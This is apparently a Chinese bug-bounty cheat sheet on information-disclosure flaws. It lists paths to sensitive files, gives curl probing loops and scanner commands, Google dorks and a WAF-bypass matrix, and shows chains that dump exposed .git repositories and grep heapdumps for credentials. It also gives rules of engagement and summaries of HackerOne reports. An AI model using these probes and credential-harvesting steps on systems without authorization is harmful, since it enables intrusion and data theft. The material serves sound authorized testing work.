# 信息泄露 / 敏感文件 / 备份

> 视角：黑盒，主动探测路径 + 被动收集前端线索

## 1. 一句话说清

信息泄露 = 服务暴露了不该暴露的资产（源码、配置、密钥、凭据、PII）。
SRC 关注：**链路终点**——一个 `.git` 泄露能直接拿数据库密码 → 提升为 P0。
WooYun 7,337 案例中 **48.7% 是敏感信息泄露**，**40% 涉及凭证 / 数据库**。

---

## 2. 高频入口点（按命中率排序）

### 2.1 版本控制泄露（560 案例）

| 路径 | 含义 | 利用工具 |
|------|------|---------|
| `/.git/config` | Git 配置（含 remote 地址） | GitHack、git-dumper、dvcs-ripper |
| `/.git/HEAD` | 当前分支 | 同上 |
| `/.git/index` | 暂存区索引 | 同上 |
| `/.git/logs/HEAD` | 操作日志 | 同上 |
| `/.git/objects/` | 对象存储 | 同上 |
| `/.svn/entries` | SVN ≤1.6 入口（**393 例高频**） | svn-extractor |
| `/.svn/wc.db` | SVN 1.7+ SQLite | sqlite3 wc.db |
| `/.svn/all-wcprops` | SVN 工作副本属性 | - |
| `/.svn/pristine/` | 原始文件 | - |
| `/.hg/` | Mercurial | dvcs-ripper |
| `/.bzr/` | Bazaar | dvcs-ripper |
| `/CVS/Entries` | CVS | - |

### 2.2 备份文件（565 案例，命中率最高）

```
# 压缩包（530 例命中）
/wwwroot.rar    /wwwroot.zip    /wwwroot.tar.gz
/www.rar        /www.zip        /www.tar.gz
/web.rar        /web.zip        /web.tar.gz
/site.rar       /site.zip       /site.tar.gz
/backup.zip     /backup.tar.gz
/{域名}.zip     /{域名}.rar     /{域名}.tar.gz   # 例：example.com.zip
/{IP}.zip                                          # 例：1.2.3.4.zip
/{年份}.zip / /backup_2024.zip / /old_2023.zip

# SQL（136 例命中）
/backup.sql     /database.sql   /db.sql   /dump.sql
/{库名}.sql     /data.sql       /sql.txt

# 配置备份（101 例命中）
/config.php.bak       /config.php~
/config.php.swp       /.config.php.swp
/config_global.php.bak
/uc_server/data/config.inc.php.bak
/web.config.bak       /.env.bak
/database.yml.bak

# 编辑器临时文件
/index.php.swp        /.index.php.swp
/index.php~           /.index.php~
/.DS_Store            /Thumbs.db
```

### 2.3 配置文件（明文暴露）

```
# Java/Spring
/WEB-INF/web.xml
/WEB-INF/applicationContext.xml
/WEB-INF/classes/application.properties
/WEB-INF/classes/jdbc.properties
/WEB-INF/classes/database.yml
/WEB-INF/classes/hibernate.cfg.xml
/application.yml          /application-prod.yml
/bootstrap.yml

# PHP
/config.php               /config/config.php
/include/config.php       /data/config.php
/conf/config.inc.php      /application/config/database.php

# .NET
/web.config               /App_Data/   /bin/
/connectionStrings.config

# 现代框架
/.env                     /.env.local   /.env.production
/.env.development         /.env.staging
/config.json              /settings.py
/appsettings.json         /appsettings.Production.json

# 容器 / k8s
/docker-compose.yml       /docker-compose.yaml
/Dockerfile
/.kube/config
```

### 2.4 探针文件（47+34+38 命中）

```
/phpinfo.php   /info.php   /test.php   /1.php   /i.php   /t.php
/probe.php     /debug.php
/test.jsp      /info.jsp
/server-status   /server-info     # Apache mod_status
/jolokia/list                     # JMX
```

### 2.5 日志（23+ 命中）

```
/ctp.log                  # 致远 OA 高频
/logs/ctp.log
/debug.log    /error.log    /access.log    /application.log
/runtime/logs/            # ThinkPHP
/storage/logs/            # Laravel
/var/log/                 # 偶尔被映射到 web 根
/WEB-INF/logs/
/_catalina.out
```

### 2.6 数据库管理面（46 命中）

```
/phpmyadmin/   /phpMyAdmin/   /pma/   /myadmin/   /mysql/
/adminer.php   /adminer/
```

### 2.7 OSS / S3 Bucket（云时代新热门）

```
# AWS S3
https://{bucket}.s3.amazonaws.com/
https://{bucket}.s3.{region}.amazonaws.com/
https://s3.amazonaws.com/{bucket}/

# 阿里云 OSS
https://{bucket}.oss-{region}.aliyuncs.com/

# 腾讯云 COS
https://{bucket}.cos.{region}.myqcloud.com/

# 列出对象（公开 bucket）
?list-type=2
?prefix=&delimiter=/
```

工具：`s3scanner`、`gobuster s3`、`oss-attack`。

---

## 3. 探测手法

### 3.1 一行命令探测

```bash
# 版本控制
for p in .git/config .git/HEAD .svn/entries .svn/wc.db .hg/store; do
  curl -s -o /dev/null -w "%{http_code} $p\n" https://target/$p
done

# 备份文件
for ext in zip rar tar.gz sql bak; do
  for name in www web site backup wwwroot data; do
    curl -s -o /dev/null -w "%{http_code} /$name.$ext\n" https://target/$name.$ext
  done
done

# 域名 / 子域备份
DOMAIN=$(echo target.com | sed 's/\./ /g' | awk '{print $1}')
curl -s -o /dev/null -w "%{http_code} /$DOMAIN.zip\n" https://target/$DOMAIN.zip
```

### 3.2 自动化扫描

```bash
# dirsearch / ffuf 配合敏感字典
dirsearch -u https://target/ -e php,jsp,asp,bak,zip,rar,sql -w wordlists/sensitive.txt
ffuf -u https://target/FUZZ -w sensitive-paths.txt -mc 200,301 -fc 404

# 专用工具
nuclei -u https://target -t exposures/

# .git 自动还原
git-dumper https://target/.git/ ./loot/
GitHack https://target/.git/
```

### 3.3 Google Hacking 字典

```
site:target.com filetype:sql
site:target.com filetype:bak
site:target.com filetype:env
site:target.com filetype:log
site:target.com inurl:.git
site:target.com inurl:.svn
site:target.com intitle:"index of" .git
site:target.com inurl:phpinfo
site:target.com "db_password"
site:target.com "mysql_connect"
inurl:wp-config.php.bak

# Github / Gitee 关键字泄露
"target.com" password
"@target.com" filename:.env
```

### 3.4 被动信息（前端线索）

| 来源 | 找什么 |
|------|------|
| HTML 注释 | `<!-- TODO: 上线前删 admin/admin -->` |
| JS 文件 | `apiKey =`、`SECRET_KEY =`、`token =`、`/api/internal/` 路径 |
| Source map | 站点是否暴露 `.map` 文件，可还原原始 TS/SCSS |
| 响应头 | `X-Powered-By`、`Server`、`X-AspNet-Version`、`X-DNS-Prefetch-Control` |
| robots.txt | `Disallow: /admin/` 暴露管理路径 |
| sitemap.xml | 暴露非链接的 URL |
| crossdomain.xml / clientaccesspolicy.xml | Flash/Silverlight 跨域配置 |
| `.well-known/security.txt` | 联系方式 |
| `.well-known/openid-configuration` | OAuth 配置（可看到 jwks_uri） |
| Wayback Machine | 历史页面可能暴露已删除的接口 |

### 3.5 错误页触发字典（让目标"主动报错"）

```
?id=1'              → SQL 错误（暴露数据库类型 + 路径）
?id[]=1             → 类型错误（PHP/Java 报 stack trace）
?file=              → 空值导致路径泄露
?xml=<a/>           → XML 解析错误
/exists.php?p=null  → 看堆栈
```

---

## 4. Bypass 矩阵

| 拦截 | 绕过 |
|------|------|
| `.git` 路径被 nginx 拦 | `.GIT/`、`.GiT/`、`%2egit/`、`/x/../.git/`、`//.git/` |
| `.env` 拦 | `/static/../.env`、`/uploads/.env`、`/.env%20`、`/.env.bak` |
| 备份文件后缀拦 | `.bak.bak`、`.swp` 而非 `.bak`、URL encode 后缀 |
| Cloudflare 拦 | 找 origin IP（绕过 CDN，详见 `ssrf-cache-host.md`） |
| 文件名混淆 | 时间戳：`/backup_$(date +%Y%m%d).zip`、`/2024-01-15.sql` |
| 大小写 | `/Backup.ZIP`、`/Config.PHP.BAK` |

---

## 5. 利用提权 / 横向（链路放大）

### 5.1 .git → 全部源码 → DB 密码

```bash
# 1. dump
git-dumper https://target/.git/ ./loot/
cd loot && git log --all
git show <commit>:config.php

# 2. 找凭据
grep -rE "(password|secret|apikey|token|jdbc:|mysql://|redis://)" .

# 3. 直连
mysql -h db.internal -u root -p
```

参考案例：wooyun-2015-0125565（阡陌金融 .git → 数据库密码）。

### 5.2 .env → S3 / Stripe / SMTP 接管

```
.env 常含：
  AWS_ACCESS_KEY_ID=AKIA...
  AWS_SECRET_ACCESS_KEY=...
  STRIPE_SECRET_KEY=sk_live_...
  SENDGRID_API_KEY=SG....
  TWILIO_AUTH_TOKEN=...
  JWT_SECRET=...
  DATABASE_URL=postgres://user:pass@host/db

→ AWS：aws s3 ls / aws sts get-caller-identity（不要做删除/创建动作）
→ JWT secret：本地伪造任意用户 token
→ DB：连接读 schema 即可，禁导出
```

### 5.3 Heapdump → JVM 内存里的密码

```bash
curl http://target/actuator/heapdump -o heap.bin
strings heap.bin | grep -iE "(password|secret|jdbc|jwt|redis|aws)" | sort -u
# 或用 MAT、jhat 分析
```

### 5.4 Swagger / API docs → 隐藏端点

```
/swagger-ui.html 显示完整 API 列表，包括：
  /api/internal/admin/users
  /api/v2/secret-debug
  /api/dev/dump
攻击者基于这个列表全量打。
```

### 5.5 短信 / 邮件 / 支付 API 凭据 → 全用户接管

```
泄露的短信平台凭据 → 调用 /api/sendSms 看到所有用户验证码
→ 用验证码重置任意用户密码 → 账户接管
```

参考：wooyun-2015-0128813（某零食电商短信接口）。

---

## 6. 真实案例指纹

| 案例 ID | 类型 | 利用链 |
|--------|------|------|
| wooyun-2015-0123377 | 整站源码 zip | 源码→配置→数据库→提权 |
| wooyun-2013-038850 | TOM SVN 泄露 | SVN→源码→SQL 注入 |
| wooyun-2015-0120183 | log4net.xml/MongoDB 配置 | 配置→MongoDB→数据 |
| wooyun-2015-0163955 | 黄金集团 Session 日志 | 后台→日志→Session 劫持 |
| wooyun-2015-0128813 | 某零食电商短信 API | API→短信→账户接管 |
| wooyun-2015-0125565 | 阡陌金融 .git | .git→数据库密码 |
| wooyun-2014-049693 | 太平洋时尚网 .svn | .svn→目录遍历 |
| wooyun-2014-085529 | hitao MongoDB 未授权 | Mongo→FTP→订单数据 |
| wooyun-2015-0150430 | 某航空公司邮箱 | 邮箱→域密码→VPN |
| wooyun-2013-039470 | 某电脑厂商 data.zip | 备份文件→数据库配置 |

通用指纹：

- **`/static/.git/HEAD` 200** + 内容 `ref: refs/heads/main` → 立即 dump
- **`/.env` 返回 200 + Content-Type: text/plain** + 含 `=` → 配置泄露
- **`/wwwroot.rar` Content-Length > 1MB** → 整站源码
- **`/server-status` 含 `Apache Status` + IP 列表** → mod_status 暴露
- **`/actuator/health` 200 + `{"status":"UP"}`** → 进一步探 actuator/env / heapdump
- **`/swagger-ui.html` + 渲染出 API 列表** → 全量端点

---

## 7. 复现 / 证据要点

### 7.1 报告必备

1. 完整请求 URL（含协议）
2. 响应状态码 + 关键 Header
3. 响应体片段（**敏感数据必须脱敏**）
4. 影响：根据泄露内容估算（密码 → DB → 用户数据）

### 7.2 脱敏样式

```
原文（不要写进报告）：
  spring.datasource.password=Mp4ssw0rd!

报告（这样写）：
  spring.datasource.password=M****d!（共 13 位）

原文：
  ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDxxxx... user@host

报告：
  ssh-rsa AAAAB3...（前 8 字符 + 后 8 字符 + 长度）user@host
```

### 7.3 CVSS 参考

```
.git 泄露源码                 CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N = 7.5
.env 泄露 prod 凭据           CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H = 9.8（依赖凭据用途）
phpinfo.php 暴露              CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N = 5.3
heapdump 含 DB 密码           = 9.8 Critical
public S3 bucket 含 PII       = 7.5+
```

### 7.4 影响段写法

```
通过未授权访问 /.git/ 目录，攻击者可使用 git-dumper 工具完整恢复后端
源代码（约 400 个 .java 文件）。源码中 src/main/resources/application-prod.yml
明文存储以下凭据：
1. 主数据库密码（mysql://prod-db:3306），可直读所有用户表；
2. JWT 签名密钥，可伪造任意用户身份；
3. AWS S3 Access Key，可读取存储桶中所有用户上传文件。

我已停止于"读到 application-prod.yml 文件名"步骤，未尝试连接任何凭据。
```

---

## 8. 不要做的事

- **禁**：clone 完整源码到自己 GitHub / 公网仓库。本地保存，报告后删除。
- **禁**：用泄露的 AWS / Stripe / SendGrid 凭据创建资源、发邮件、扣款。
- **禁**：用泄露的 DB 凭据连接生产库导出数据。仅做"能 telnet 通端口 + 看到 DB banner"的最小验证。
- **禁**：用泄露的短信 API 给真实手机号发短信。
- **禁**：在报告中粘贴完整凭据。脱敏，附 sha256 指纹证明你拿到过。
- **限**：扫描限速 1–5 rps；备份字典控制在 1000 条以内，避免触发风控。

## H1 真实案例

_共 319 份 HackerOne 已披露 High/Critical 报告命中本类，按 (赏金 + 投票×100) 排序取 Top 12_

| Severity | $ | 程序 | 标题（点击看原报告） | 摘要 |
|---|--:|---|---|---|
| Critical | 50000 usd | Shopify | [Github access token exposure](https://hackerone.com/reports/1087489) | While dissecting an application made by one of your employees I found his GitHub Personal Access Token (PAT), he's a member of … |
| High | 20000 usd | HackerOne | [Account takeover via leaked session cookie](https://hackerone.com/reports/745324) | Summary:** You are disclose for me you session Description:** you are gevi me your session on last report I am can use your ses… |
| Critical | — | HackerOne | [Confidential data of users and limited metadata of programs and reports accessible via GraphQL](https://hackerone.com/reports/489146) | Summary:** The GraphQL endpoint doesn't have access controls implemented properly |
| Critical | 25000 usd | HackerOne | [The /reports/:id.json endpoint discloses potentially sensitive user attributes when reporter summ…](https://hackerone.com/reports/3000510) | Hi The.json endpoint of any disclosed report is leaking reporter's email, OTP backup codes, reporter's phone number, "graphql_s… |
| Critical | 39999 usd | Uber | [[Pre-Submission][H1-4420-2019] API access to Phabricator on code.uberinternal.com from leaked cer…](https://hackerone.com/reports/591813) | [Pre-Submission][H1-4420-2019] API access to Phabricator on code.uberinternal.com from leaked certificate in git repo |
| High | 7500 usd | HackerOne | [Customer private program can disclose email any users through invited via username](https://hackerone.com/reports/807448) | Summary: Hey team,This bug could have been used by my calculations a long time ago Steps To Reproduce: 1)Go to https://hackeron… |
| High | — | Uber | [Sensitive user information disclosure at bonjour.uber.com/marketplace/_rpc via the 'userUuid' par…](https://hackerone.com/reports/542340) | Sensitive user information disclosure at bonjour.uber.com/marketplace/_rpc via the 'userUuid' parameter |
| High | 15000 usd | Snapchat | [Open prod Jenkins instance](https://hackerone.com/reports/231460) | Open prod Jenkins instance |
| Critical | — | Snapchat | [Github Token Leaked publicly for https://github.sc-corp.net](https://hackerone.com/reports/396467) | Description : GitHub is a truly awesome service but it is unwise to put any sensitive data in code that is hosted on GitHub and… |
| High | 10000 usd | Snapchat | [Access to multiple production Grafana dashboards](https://hackerone.com/reports/663628) | Access to multiple production Grafana dashboards |
| High | 12500 usd | HackerOne | [An attacker can can view any hacker email via  /SaveCollaboratorsMutation operation name](https://hackerone.com/reports/2032716) | Summary:** An attacker can view any attacker or normal user email after send invitation via dummy report , disclose their priva… |
| Critical | 10000 usd | GitLab | [gitlab-workhorse bypass in Gitlab::Middleware::Multipart allowing files in `allowed_paths` to be …](https://hackerone.com/reports/850447) | Summary Extracted from https://hackerone.com/reports/835455#activity-7672566 While testing and looking at the patch for the nug… |

**命中本类的 weakness 分布：**

- Information Disclosure：207 条
- Cleartext Storage of Sensitive Information：22 条
- Insecure Storage of Sensitive Information：22 条
- Privacy Violation：15 条
- Information Exposure Through Directory Listing：12 条
- Insufficiently Protected Credentials：10 条
- Uncategorized → 手工归类：6 条
- Information Exposure Through Debug Information：5 条
- Cleartext Transmission of Sensitive Information：5 条
- Information Exposure Through Sent Data：4 条
- Information Exposure Through an Error Message：3 条
- Missing Encryption of Sensitive Data：3 条
- File and Directory Information Exposure：2 条
- Password in Configuration File：2 条
- Inclusion of Sensitive Information in an Include File：1 条
